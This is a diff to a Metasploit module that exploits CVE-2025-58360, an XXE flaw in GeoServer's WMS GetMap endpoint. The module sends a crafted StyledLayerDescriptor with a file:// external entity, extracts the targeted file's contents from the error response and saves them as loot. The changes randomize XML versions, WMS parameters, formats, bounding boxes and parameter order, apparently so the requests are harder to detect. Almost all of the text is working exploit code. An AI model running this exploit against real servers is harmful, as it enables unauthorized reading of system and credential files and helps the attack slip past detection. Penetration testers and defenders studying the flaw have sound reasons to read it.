@@ -27,8 +27,9 @@ class MetasploitModule < Msf::Auxiliary
         },
         'License' => MSF_LICENSE,
         'Author' => [
-          'xbow-security',                              # Vulnerability discovery
-          'Valentin Lobstein <chocapikk[at]leakix.net>' # Metasploit module
+          'xbow-security',                               # Vulnerability discovery
+          'Valentin Lobstein <chocapikk[at]leakix.net>', # Metasploit module
+          'Julien Voisin'                                # Randomization suggestions
         ],
         'References' => [
           ['CVE', '2025-58360'],
@@ -51,58 +52,34 @@ class MetasploitModule < Msf::Auxiliary
     )
   end
 
-  # NOTE: No check method implemented as the GeoServer version page
-  # (AboutGeoServerPage) requires authentication in most configurations,
-  # making version detection unreliable without credentials.
-
   def build_xxe_payload(file_path)
     entity_name = Rex::Text.rand_text_alpha_lower(8)
-    %(<?xml version="1.0" encoding="UTF-8"?>
+    %(<?xml version="#{rand(2) == 0 ? '1.0' : '1.1'}" encoding="UTF-8"?>
 <!DOCTYPE StyledLayerDescriptor [
 <!ENTITY #{entity_name} SYSTEM "file://#{file_path}">
 ]>
-<StyledLayerDescriptor version="1.0.0">
+<StyledLayerDescriptor version="#{rand(2) == 0 ? '1.0.0' : '1.1.0'}">
 <NamedLayer><Name>&#{entity_name};</Name></NamedLayer>
 </StyledLayerDescriptor>)
   end
 
   def build_wms_uri
-    # Generate random width and height using Rex::Text (100-500)
-    width, height = Array.new(2) do
-      100 + (Rex::Text.rand_text_numeric(3).to_i % 401)
-    end
-
-    # Randomize bbox coordinates (valid geographic bounds) using Rex::Text
-    # Generate min_x, max_x ensuring min_x < max_x
-    min_x = (-180.0 + (Rex::Text.rand_text_numeric(3).to_i % 179)).round(2)
-    max_x = (min_x + 0.1 + (Rex::Text.rand_text_numeric(3).to_i % ((180.0 - min_x) * 10).to_i) / 10.0).round(2)
-    max_x = [max_x, 180.0].min
-
-    # Generate min_y, max_y ensuring min_y < max_y
-    min_y = (-90.0 + (Rex::Text.rand_text_numeric(2).to_i % 89)).round(2)
-    max_y = (min_y + 0.1 + (Rex::Text.rand_text_numeric(2).to_i % ((90.0 - min_y) * 10).to_i) / 10.0).round(2)
-    max_y = [max_y, 90.0].min
-
-    bbox_coords = [min_x, min_y, max_x, max_y]
-
-    base_uri = normalize_uri(target_uri.path, 'wms')
+    min_x = rand(-180.0..180.0).round(2)
+    min_y = rand(-90.0..90.0).round(2)
     params = {
       'service' => 'WMS',
-      'version' => '1.1.0',
+      'version' => ['1.0.0', '1.1.1', '1.3.0'].sample,
       'request' => 'GetMap',
-      'width' => width,
-      'height' => height,
-      'format' => 'image/png',
-      'bbox' => bbox_coords.join(',')
+      'width' => rand(100..500),
+      'height' => rand(100..500),
+      'format' => ['image/png', 'image/jpeg', 'image/gif'].sample,
+      'bbox' => [min_x, min_y, rand(min_x..180.0).round(2), rand(min_y..90.0).round(2)].join(',')
     }
-
-    "#{base_uri}?#{params.map { |k, v| "#{k}=#{v}" }.join('&')}"
+    "#{normalize_uri(target_uri.path, 'wms')}?#{params.to_a.shuffle.map { |k, v| "#{k}=#{v}" }.join('&')}"
   end
 
   def extract_file_content(response_body)
-    # Extract content between "Unknown layer:" and "</ServiceException>"
-    regex = %r{Unknown layer:\s*([\s\S]+?)</ServiceException>}
-    match = response_body.match(regex)
+    match = response_body.match(%r{Unknown layer:\s*([\s\S]+?)</ServiceException>})
     return nil unless match
 
     content = match[1]&.strip
@@ -111,15 +88,13 @@ class MetasploitModule < Msf::Auxiliary
 
   def send_xxe_request
     uri = build_wms_uri
-    payload = build_xxe_payload(datastore['FILEPATH'])
-
     print_status("Sending XXE payload to #{uri}")
 
     res = send_request_cgi({
       'method' => 'POST',
       'uri' => uri,
       'ctype' => 'application/xml',
-      'data' => payload
+      'data' => build_xxe_payload(datastore['FILEPATH'])
     })
 
     fail_with(Failure::Unreachable, 'No response from server') unless res
@@ -145,16 +120,14 @@ class MetasploitModule < Msf::Auxiliary
     print_line(file_content)
     print_line
 
-    path = store_loot(
+    print_good("File saved to: #{store_loot(
       'geoserver.file',
       'text/plain',
       datastore['RHOST'],
       file_content,
       File.basename(datastore['FILEPATH']),
       'File read from GeoServer via XXE (CVE-2025-58360)'
-    )
-
-    print_good("File saved to: #{path}")
+    )}")
   end
 
 end
